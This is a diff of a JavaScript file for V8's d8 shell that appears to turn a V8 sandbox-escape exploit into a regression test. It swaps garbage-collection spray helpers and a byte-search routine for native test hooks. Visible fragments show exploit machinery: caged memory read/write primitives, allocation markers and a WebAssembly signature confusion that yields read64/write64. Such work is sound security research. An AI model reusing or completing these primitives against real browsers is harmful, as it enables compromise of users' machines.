@@ -2,11 +2,9 @@
 // Use of this source code is governed by a BSD-style license that can be
 // found in the LICENSE file.
 
-// Flags: --sandbox-testing
+// Flags: --sandbox-testing --expose-gc --allow-natives-syntax
 
 d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
-
-// main exploit
 
 const kHeapObjectTag = 1;
 const kWeakHeapObjectTag = 3;
@@ -36,50 +34,8 @@ for (let bits = 8; bits <= 64; bits *= 2) {
 }
 globalThis.caged_read = globalThis.caged_read32;
 globalThis.caged_write = globalThis.caged_write32;
-function gc_minor() { // scavenge
-  for (let i = 0; i < 1000; i++) {
-    new ArrayBuffer(0x10000);
-  }
-}
-function gc_major() { // mark-sweep
-  try {
-    new ArrayBuffer(0x7fe00000);
-  } catch {
-  }
-}
-function str2ascii(str) {
-  return str.split('').map(char => char.charCodeAt(0));
-}
-// modified from https://stackoverflow.com/a/14163193
-function inject_indexOfMulti() {
-  for (const TypedArray of [Uint8Array, Uint16Array, Uint32Array, BigUint64Array]) {
-    TypedArray.prototype.indexOfMulti = function(searchElements, fromIndex) {
-      fromIndex = fromIndex || 0;
 
-      for (;;) {
-        let index = Array.prototype.indexOf.call(this, searchElements[0], fromIndex);
-        if (searchElements.length === 1 || index === -1) {
-          // Not found or no other elements to check
-          return index;
-        }
-
-        let i, j, fail = false;
-        for (i = index + 1, j = 1; j < searchElements.length && i < this.length; i++, j++) {
-          if (this[i] !== searchElements[j]) {
-            fromIndex = index + 1;
-            fail = true;
-            break;
-          }
-        }
-        if (fail) continue;
-
-        return (i === index + searchElements.length) ? index : -1;
-      }
-    };
-  }
-}; inject_indexOfMulti();
-
-gc_major();
+gc();
 
 // fill in any gc gaps & alloc marker 0
 // these markers are for EPT stride computation
@@ -197,9 +153,10 @@ let {called_fn, read64, write64} = instance2.exports;
 // => memory0 accesses now target wasm::CanonicalSig
 
 // tier-up compile to avoid LiftoffFrameSetup shenanigans and related trusted instance data access
-for (let i = 0; i < 0x100000; i++) {
+for (let i = 0; i < 10; i++) {
   called_fn(1n, 2n);
 }
+%WasmTierUpFunction(called_fn);
 
 function sig_read(ofs) {
   // call_fn -> imported call fn == invalid call to called_fn
